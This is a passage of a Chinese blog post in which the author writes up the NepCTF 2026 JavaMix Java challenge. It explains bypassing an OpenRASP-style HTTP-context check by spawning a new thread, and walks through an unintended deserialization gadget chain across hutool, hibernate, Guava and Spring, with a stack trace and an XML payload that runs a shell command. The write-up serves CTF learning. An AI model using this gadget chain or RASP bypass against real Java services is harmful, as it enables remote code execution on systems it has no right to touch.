class="string">&quot;org.apache.tomcat.&quot;</span>,</span><br><span class="line">            <span class="string">&quot;org.apache.cxf.&quot;</span>, <span class="string">&quot;org.springframework.web.&quot;</span>,</span><br><span class="line">            <span class="string">&quot;org.eclipse.jetty.&quot;</span>, <span class="string">&quot;io.undertow.&quot;</span></span><br><span class="line">        &#125;;</span><br><span class="line">        StackTraceElement[] stack = currentThread.getStackTrace();</span><br><span class="line">        <span class="keyword">for</span> (StackTraceElement frame : stack) &#123;</span><br><span class="line">            <span class="keyword">for</span> (String webFrame : WEB_CONTEXT_FRAMES) &#123;</span><br><span class="line">                <span class="keyword">if</span> (frame.getClassName().startsWith(webFrame)) &#123;</span><br><span class="line">                    isHttpThread = <span class="literal">true</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 只有 HTTP 请求上下文中的命令执行才拦截</span></span><br><span class="line">    <span class="keyword">if</span> (isHttpThread) &#123;</span><br><span class="line">        logBlock(currentThread);  <span class="comment">// 打印 [OpenRASP] 拦截日志</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>核心缺陷</strong>：RASP 仅对 HTTP 请求上下文中的命令执行进行拦截，无法覆盖从 HTTP 线程中 fork 出的新线程。</p>
+<p>这里就可以通过经典的新线程逃逸去绕过Rasp的Http上下文检测。</p>
+<p>这是当时从腾讯Rasp挑战赛看到的一种绕过：</p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=Mzk0OTU2ODQ4Mw==&mid=2247487523&idx=1&sn=97a5e73e91f765fbd695092880edb15a&poc_token=HCeRZGqjLloScuugDzXZ2lBAgw3vuo-X5sGmlDPs" >https://mp.weixin.qq.com/s?__biz=Mzk0OTU2ODQ4Mw==&amp;mid=2247487523&amp;idx=1&amp;sn=97a5e73e91f765fbd695092880edb15a&amp;poc_token=HCeRZGqjLloScuugDzXZ2lBAgw3vuo-X5sGmlDPs<i class="fas fa-external-link-alt"></i></a></p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1784975716198-71b68d5a-33bd-445a-bae4-409aef3eafa7.png"  alt="img"></p>
+<p>这里是自己先通过反序列化加载了CmdRunner类，然后在内存马里调用，实现新线程绕过：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1784976009347-30cfb32c-ff48-4943-872f-e82e30320dfb.png"  alt="img"></p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1784975992786-2fd5e407-fa3c-4f4b-bb0a-04ca99d2efac.png"  alt="img"></p>
+<h1 id="附件地址"><a href="#附件地址" class="headerlink" title="附件地址"></a>附件地址</h1><p>完整的题目源码已经上传到我的仓库：</p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://github.com/1diot9/CTFJavaChallenge/tree/main/2026/NepCTF/JavaMix" >https://github.com/1diot9/CTFJavaChallenge/tree/main/2026/NepCTF/JavaMix<i class="fas fa-external-link-alt"></i></a></p>
+<p>完整解题脚本在：</p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://github.com/1diot9/CTFJavaChallenge/tree/main/2026/NepCTF/JavaMix/solve" >https://github.com/1diot9/CTFJavaChallenge/tree/main/2026/NepCTF/JavaMix/solve<i class="fas fa-external-link-alt"></i></a></p>
+<h1 id="非预期-黑名单绕过"><a href="#非预期-黑名单绕过" class="headerlink" title="非预期-黑名单绕过"></a>非预期-黑名单绕过</h1><p>这里选手采用的，是通过java.lang.invoke.SerializedLambda自定义一个恶意匿名类，然后在代理类的反序列化中，触发匿名类实现构造方法调用。这是我的一个知识盲区，之前从来没见到过这种手法，是从选手们的wp中学习的，至少有两位选手都采取了这种方式解题。<strong>我想这就是AI时代下的CTF的意义吧，总能找到题目的非预期，从而完善自己的知识面。</strong></p>
+<p>这里采用从sink–&gt;source的分析逻辑。</p>
+<p>首先，看到cn.hutool.core.lang.Singleton#get(java.lang.Class<T>, java.lang.Object…)里的匿名类：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1784987763306-08585533-2e36-4d29-afff-f344dd0cfe6d.png"  alt="img"></p>
+<p>这个匿名类能够调用任意public构造方法。那么就联想到org.springframework.context.support.FileSystemXmlApplicationContext或org.springframework.context.support.ClassPathXmlApplicationContext去加载xml，从而实现任意代码执行。</p>
+<p>通过下面的代码，我们能够提取出这个匿名类的完整类名：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1784987890794-291699a4-16d5-4933-892e-4a5b36a916d0.png"  alt="img"></p>
+<p>然后通过java.lang.invoke.SerializedLambda去创建一个可序列化的匿名类：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1784987935123-fa339083-3322-40ff-bfbc-f98e86f25963.png"  alt="img"></p>
+<p>这里的cn.hutool.core.lang.func.Func0 是为了创建一个能通过call延迟触发的匿名函数，类似下面：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Func0&lt;String&gt; f = () -&gt; <span class="string">&quot;hello&quot;</span>;   <span class="comment">// lambda 实现接口</span></span><br><span class="line">f.call();                          <span class="comment">// 执行</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>那么现在就要找到哪里能够触发call，这里找到hibernate依赖里的org.hibernate.property.access.spi.GetterMethodImpl#get：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1784988161218-dded201e-9560-4353-b170-4bf15d1c4692.png"  alt="img"></p>
+<p>这里的getterMethod可以是任意public method，当然也可以是我们上面提到的call方法，而这里的owner参数，就是上面创建的恶意匿名函数。</p>
+<p>现在就是想办法触发get方法。这里是一个难点，容易搞不清楚。</p>
+<p>首先，要创建一个动态代理proxyMap，代理getter对象，如下：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1784988531113-77ca281b-88b9-4616-a8d7-214bed2df4e6.png"  alt="img"></p>
+<p>这个动态代理比较特殊，同时代理了两个接口，第一个是org.hibernate.property.access.spi.Getter，第二个是java.util.Map，而Getter就是GetterMethodImpl的接口。</p>
+<p>接着创建java.util.function.Function 对象：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1784988816010-0863cf5d-e9fd-4b55-9dc1-6edfa573ac35.png"  alt="img"></p>
+<p>forgedFunc0就是一开始创造的恶意匿名函数。</p>
+<p>现在可以看调试了，从cn.hutool.core.comparator.FuncComparator#doCompare开始看：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1784988936033-48623f82-451c-4b0e-b65e-2d21dcf88053.png"  alt="img"></p>
+<p>这里调用apply，实际上是com.google.common.base.Functions.FunctionComposition#apply：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1784989021479-cdc60c1c-cc08-465f-bc96-ff1351b086b4.png"  alt="img"></p>
+<p>f是com.google.common.base.Functions.ConstantFunction#ConstantFunction，其apply方法永远返回value字段，也就是那个匿名函数：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1784989092704-9eb59a85-cdc2-4b10-bffd-ea4a4cf53390.png"  alt="img"></p>
+<p>g是com.google.common.base.Functions.FunctionForMapNoDefault#FunctionForMapNoDefault：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1784989302754-2fe58680-ad9b-4cd3-822c-6fab40168523.png"  alt="img"></p>
+<p>map是前面的proxyMap代理。前面说过，这个动态代理同时代理了两个接口，第一个是org.hibernate.property.access.spi.Getter，第二个是java.util.Map，而Getter就是GetterMethodImpl的接口。这两个接口都有get方法，但这里会优先调用Getter的get方法，这是java动态代理的特性，优先调用前面的接口方法。</p>
+<p>所以实际上，这里最终就调用到了org.hibernate.property.access.spi.GetterMethodImpl#get。这样就串起来了。</p>
+<p>最后的入口是com.google.common.collect.TreeMultiset。其在反序列化时，会重新一个个把元素add进来，在add进来时，就会调用compare进行比较，就会连接到cn.hutool.core.comparator.FuncComparator。</p>
+<p>对应的poc部分：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1784989434831-b36aeb61-dbb9-49ae-9e9c-5525209596af.png"  alt="img"></p>
+<p>对应的堆栈：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1784989447361-8099d7a7-fd59-47e8-b316-691da296bf69.png"  alt="img"></p>
+<p>最终的堆栈为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">at org.springframework.context.support.FileSystemXmlApplicationContext.&lt;init&gt;(FileSystemXmlApplicationContext.java:85)</span><br><span class="line">at sun.reflect.NativeConstructorAccessorImpl.newInstance0(NativeConstructorAccessorImpl.java:-1)</span><br><span class="line">at sun.reflect.NativeConstructorAccessorImpl.newInstance(NativeConstructorAccessorImpl.java:62)</span><br><span class="line">at sun.reflect.DelegatingConstructorAccessorImpl.newInstance(DelegatingConstructorAccessorImpl.java:45)</span><br><span class="line">at java.lang.reflect.Constructor.newInstance(Constructor.java:423)</span><br><span class="line">at cn.hutool.core.util.ReflectUtil.newInstance(ReflectUtil.java:865)</span><br><span class="line">at cn.hutool.core.lang.Singleton.lambda$get$3f3ed817$1(Singleton.java:39)</span><br><span class="line">at cn.hutool.core.lang.Singleton$$Lambda$5.911312317.call(Unknown Source:-1)</span><br><span class="line">at sun.reflect.NativeMethodAccessorImpl.invoke0(NativeMethodAccessorImpl.java:-1)</span><br><span class="line">at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)</span><br><span class="line">at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)</span><br><span class="line">at java.lang.reflect.Method.invoke(Method.java:498)</span><br><span class="line">at org.hibernate.property.access.spi.GetterMethodImpl.get(GetterMethodImpl.java:42)</span><br><span class="line">at sun.reflect.NativeMethodAccessorImpl.invoke0(NativeMethodAccessorImpl.java:-1)</span><br><span class="line">at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)</span><br><span class="line">at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)</span><br><span class="line">at java.lang.reflect.Method.invoke(Method.java:498)</span><br><span class="line">at cn.hutool.aop.interceptor.JdkInterceptor.invoke(JdkInterceptor.java:50)</span><br><span class="line">at com.sun.proxy.$Proxy0.get(Unknown Source:-1)</span><br><span class="line">at com.google.common.base.Functions$FunctionForMapNoDefault.apply(Functions.java:158)</span><br><span class="line">at com.google.common.base.Functions$FunctionComposition.apply(Functions.java:260)</span><br><span class="line">at cn.hutool.core.comparator.FuncComparator.doCompare(FuncComparator.java:49)</span><br><span class="line">at cn.hutool.core.comparator.NullComparator.compare(NullComparator.java:44)</span><br><span class="line">at com.google.common.collect.TreeMultiset$AvlNode.add(TreeMultiset.java:683)</span><br><span class="line">at com.google.common.collect.TreeMultiset.add(TreeMultiset.java:275)</span><br><span class="line">at com.google.common.collect.Serialization.populateMultiset(Serialization.java:135)</span><br><span class="line">at com.google.common.collect.Serialization.populateMultiset(Serialization.java:120)</span><br><span class="line">at com.google.common.collect.TreeMultiset.readObject(TreeMultiset.java:1100)</span><br><span class="line">at sun.reflect.NativeMethodAccessorImpl.invoke0(NativeMethodAccessorImpl.java:-1)</span><br><span class="line">at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)</span><br><span class="line">at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)</span><br><span class="line">at java.lang.reflect.Method.invoke(Method.java:498)</span><br><span class="line">at java.io.ObjectStreamClass.invokeReadObject(ObjectStreamClass.java:1185)</span><br><span class="line">at java.io.ObjectInputStream.readSerialData(ObjectInputStream.java:2345)</span><br><span class="line">at java.io.ObjectInputStream.readOrdinaryObject(ObjectInputStream.java:2236)</span><br><span class="line">at java.io.ObjectInputStream.readObject0(ObjectInputStream.java:1692)</span><br><span class="line">at java.io.ObjectInputStream.readObject(ObjectInputStream.java:508)</span><br><span class="line">at java.io.ObjectInputStream.readObject(ObjectInputStream.java:466)</span><br><span class="line">at com.ctf.poc.Tmp.main(Tmp.java:10)</span><br></pre></td></tr></table></figure>
+
+
+
+<p>最终的xml文件比较简单，找一个能创建子线程的方法调用即可：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag"><span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag"><span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;</span></span></span><br><span class="line"><span class="string"><span class="tag">http://www.springframework.org/schema/beans</span></span></span><br><span class="line"><span class="string"><span class="tag">http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;runner&quot;</span></span></span><br><span class="line"><span class="tag"><span class="attr">class</span>=<span class="string">&quot;org.springframework.scheduling.support.MethodInvokingRunnable&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;staticMethod&quot;</span></span></span><br><span class="line"><span class="tag"><span class="attr">value</span>=<span class="string">&quot;cn.hutool.core.util.RuntimeUtil.execForStr&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;arguments&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">list</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">array</span> <span class="attr">value-type</span>=<span class="string">&quot;java.lang.String&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">value</span>&gt;</span>/bin/sh<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">value</span>&gt;</span>-c<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">value</span>&gt;</span>/getflag &gt; /tmp/javamix_flag 2&gt;&amp;1<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">array</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">list</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;worker&quot;</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.Thread&quot;</span> <span class="attr">init-method</span>=<span class="string">&quot;start&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">ref</span>=<span class="string">&quot;runner&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>POC在<a class="link"   target="_blank" rel="noopener" href="https://github.com/1diot9/CTFJavaChallenge/blob/main/2026/NepCTF/JavaMix/solve/poc/src/main/java/com/ctf/poc/UnintendedGadget.java" >https://github.com/1diot9/CTFJavaChallenge/blob/main/2026/NepCTF/JavaMix/solve/poc/src/main/java/com/ctf/poc/UnintendedGadget.java<i class="fas fa-external-link-alt"></i></a></p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>这次主要是学习了一下非预期解里的匿名函数利用和动态代理多接口代理下的特性。</p>
+<p>希望下次还有机会给大家带来更好的题目。</p>
+
+                    
+                </div>
+
+                
+                        
+<div class="post-copyright-info-container border-box">
+    <div class="copyright-info-content border-box">
+        <div class="copyright-info-top border-box">
+            <div class="copyright-post-title border-box text-ellipsis">
+                NepCTF2026-JavaMix
+            </div>
+
+            <div class="copyright-post-link border-box text-ellipsis">
+                2026/07/30/NepCTF2026-JavaMix/
+            </div>
+        </div>
+
+        <div class="copyright-info-bottom border-box">
+            <div class="copyright-post-author bottom-item">
+                <div class="type">
+                    作者
+                </div>
+                <div class="content">1diot9</div>
+            </div>
+
+            <div class="post-time bottom-item">
+                <div class="type">
+                    发布于
+                </div>
+                <div class="content">2026-07-30 22:37</div>
+            </div>
+
+
+            <div class="post-license bottom-item">
+                <div class="type">
+                    许可
+                </div>
+                <div class="content tooltip" data-tooltip-content="CC BY-NC-SA 4.0">
+                    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh-hans" target="_blank">
+                        
+                            <i class="fa-brands fa-creative-commons"></i>
+                            <i class="fa-brands fa-creative-commons-by"></i>
+                            <i class="fa-brands fa-creative-commons-nc"></i>
+                            <i class="fa-brands fa-creative-commons-sa"></i>
+                        
+                    </a>
+                </div>
+            </div>
+        </div>
+
+        <i class="copyright-bg fa-solid fa-copyright"></i>
+    </div>
+    <div class="copy-copyright-info flex-center tooltip" data-tooltip-content="复制版权信息" data-tooltip-offset-y="-2px">
+        <i class="fa-solid fa-copy"></i>
+    </div>
+</div>
+
+                
+
+                <div class="post-bottom-tags-and-share border-box">
+                    <div>
+                        
+                            <ul class="post-tags-box border-box">
+                                
+                                    <li class="tag-item border-box">
+                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/CTF-Java/">CTF-Java</a>
+                                    </li>
+                                
+                            </ul>
+                        
+                    </div>
+                    <div>
+                        
+                    </div>
+                </div>
+
+                
+
+                
+                    <div class="post-nav border-box">
+                        
+                        
+                            <div class="next-post">
+                                <a class="next"
+                                   rel="next"
+                                   href="/2026/05/13/%E6%B3%9B%E5%BE%AEe9%E5%88%86%E6%9E%90%E6%80%9D%E8%B7%AF/"
+                                   title="泛微e9分析思路"
+                                >
+                                    <span class="title flex-center">
+                                        <span class="post-nav-title-item text-ellipsis">泛微e9分析思路</span>
+                                        <span class="post-nav-item">下一篇</span>
+                                    </span>
+                                    <span class="right arrow-icon flex-center">
+                                        <i class="fas fa-chevron-right"></i>
+                                    </span>
+                                </a>
+                            </div>
+                        
+                    </div>
+                
+
+                
+                    
+
+
+
+
+
+
+                
+            </div>
+        </div>
+
+        
+            <div class="pc-post-toc right-toc">
+                <div class="post-toc-wrap border-box">
+    <div class="post-toc border-box">
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#SSRF%E9%87%8D%E5%AE%9A%E5%90%91"><span class="nav-number">2.</span> <span class="nav-text">SSRF重定向</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#hutools%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-number">3.</span> <span class="nav-text">hutools二次反序列化</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Rasp%E7%BB%95%E8%BF%87"><span class="nav-number">4.</span> <span class="nav-text">Rasp绕过</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%99%84%E4%BB%B6%E5%9C%B0%E5%9D%80"><span class="nav-number">5.</span> <span class="nav-text">附件地址</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%9D%9E%E9%A2%84%E6%9C%9F-%E9%BB%91%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87"><span class="nav-number">6.</span> <span class="nav-text">非预期-黑名单绕过</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">7.</span> <span class="nav-text">总结</span></a></li></ol>
+    </div>
+</div>
+
+            </div>
+        
+    </div>
+</div>
+
+
+                
+            </div>
+        </div>
+
+        <div class="page-main-content-bottom border-box">
+            
+<footer class="footer border-box">
+    <div class="copyright-info info-item">
+    &copy;&nbsp;<span>2025</span>&nbsp;-&nbsp;2026
+    
+            &nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;&nbsp;<a href="/">1diot9</a>
+        
+    </div>
+
+    <div class="theme-info info-item">
+        由&nbsp;<a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;驱动&nbsp;&&nbsp;主题&nbsp;<a class="keep-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep</a>
+    </div>
+
+    
+        
+        <div class="deploy-info info-item">
+            
+            本站由 <span class="tooltip" data-tooltip-content="GitHub Pages"><img src="/images/brands/github.png"></span> 提供部署服务
+            
+        </div>
+    
+
+    
+        <div class="count-info info-item">
+            
+                <span class="count-item border-box word">
+                    <span class="item-type border-box">总字数</span>
+                    <span class="item-value border-box word">195.1k</span>
+                </span>
+            
+
+            
+                <span class="count-item border-box uv">
+                    <span class="item-type border-box">访客数</span>
+                    <span class="item-value border-box uv" id="busuanzi_value_site_uv"></span>
+                </span>
+            
+
+            
+                <span class="count-item border-box pv">
+                    <span class="item-type border-box">访问量</span>
+                    <span class="item-value border-box pv" id="busuanzi_value_site_pv"></span>
+                </span>
+            
+        </div>
+    
+
+    
+</footer>
+
+        </div>
+    </div>
+
+    <!-- post tools -->
+    
+        <div class="post-tools right-toc">
+            <div class="post-tools-container border-box">
+    <ul class="post-tools-list border-box">
+        <!-- PC encrypt again -->
+        
+
+        <!-- PC TOC show toggle -->
+        
+            <li class="tools-item flex-center toggle-show-toc">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        <!-- PC go comment -->
+        
+
+        <!-- PC full screen -->
+        <li class="tools-item flex-center full-screen">
+            <i class="fa-solid fa-expand"></i>
+        </li>
+    </ul>
+</div>
+
+        </div>
+    
+
+    <!-- side tools -->
+    <div class="side-tools">
+        <div class="side-tools-container border-box ">
+    <ul class="side-tools-list side-tools-show-handle border-box">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <!-- toggle mode -->
+        
+            <li class="tools-item tool-toggle-theme-mode flex-center">
+                <i class="fas fa-moon"></i>
+            </li>
+        
+
+        <!-- rss -->
+        
+
+        <!-- to bottom -->
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list border-box">
+        
+            <li class="tools-item toggle-show-toc-tablet flex-center">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        
+
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+
+        <li class="tools-item tool-scroll-to-top flex-center show-arrow">
+            <i class="arrow fas fa-arrow-up"></i>
+            <span class="percent"></span>
+        </li>
+    </ul>
+</div>
+
+    </div>
+
+    <!-- image mask -->
+    <div class="zoom-in-image-mask">
+    <img class="zoom-in-image">
+</div>
+
+
+    <!-- local search -->
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fas fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="搜索..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="close-popup-btn">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+    <!-- tablet toc -->
+    
+        <div class="tablet-post-toc-mask">
+            <div class="tablet-post-toc">
+                <div class="post-toc-wrap border-box">
+    <div class="post-toc border-box">
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#SSRF%E9%87%8D%E5%AE%9A%E5%90%91"><span class="nav-number">2.</span> <span class="nav-text">SSRF重定向</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#hutools%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-number">3.</span> <span class="nav-text">hutools二次反序列化</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Rasp%E7%BB%95%E8%BF%87"><span class="nav-number">4.</span> <span class="nav-text">Rasp绕过</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%99%84%E4%BB%B6%E5%9C%B0%E5%9D%80"><span class="nav-number">5.</span> <span class="nav-text">附件地址</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%9D%9E%E9%A2%84%E6%9C%9F-%E9%BB%91%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87"><span class="nav-number">6.</span> <span class="nav-text">非预期-黑名单绕过</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">7.</span> <span class="nav-text">总结</span></a></li></ol>
+    </div>
+</div>
+
+            </div>
+        </div>
+    
+</main>
+
+
+
+
+
+<!-- common js -->
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/header-shrink.js"></script>
+
+<script src="/js/back2top.js"></script>
+
+<script src="/js/toggle-theme.js"></script>
+
+<script src="/js/code-block.js"></script>
+
+<script src="/js/main.js"></script>
+
+<script src="/js/libs/anime.min.js"></script>
+
+
+<!-- local search -->
+
+    
+<script src="/js/local-search.js"></script>
+
+
+
+<!-- lazyload -->
+
+
+<div class="pjax">
+    <!-- home page -->
+    
+
+    <!-- post page -->
+    
+        <!-- post-helper -->
+        
+<script src="/js/post/post-helper.js"></script>
+
+
+        <!-- toc -->
+        
+            
+<script src="/js/post/toc.js"></script>
+
+        
+
+        <!-- copyright-info -->
+        
+            
+<script src="/js/post/copyright-info.js"></script>
+
+        
+
+        <!-- share -->
+        
+    
+
+    <!-- categories page -->
+    
+
+    <!-- links page -->
+    
+
+    <!-- photos page -->
+    
+
+    <!-- tools page -->
+    
+</div>
+
+<!-- mermaid -->
+
+
+<!-- pjax -->
+
+    
+<script src="/js/libs/pjax.min.js"></script>
+
+<script>
+    window.addEventListener('DOMContentLoaded', () => {
+        window.pjax = new Pjax({
+            selectors: [
+                'head title',
+                '.page-container',
+                '.pjax'
+            ],
+            history: true,
+            debug: false,
+            cacheBust: false,
+            timeout: 0,
+            analytics: false,
+            currentUrlFullReload: false,
+            scrollRestoration: false,
+        });
+
+        document.addEventListener('pjax:send', () => {
+            KEEP.utils.pjaxProgressBarStart()
+        });
+
+        document.addEventListener('pjax:complete', () => {
+            KEEP.utils.pjaxProgressBarEnd()
+            window.pjax.executeScripts(document.querySelectorAll('script[data-pjax], .pjax script'))
+            KEEP.initExecute()
+        });
+    });
+</script>
+
+
+
+
+</body>
+</html>
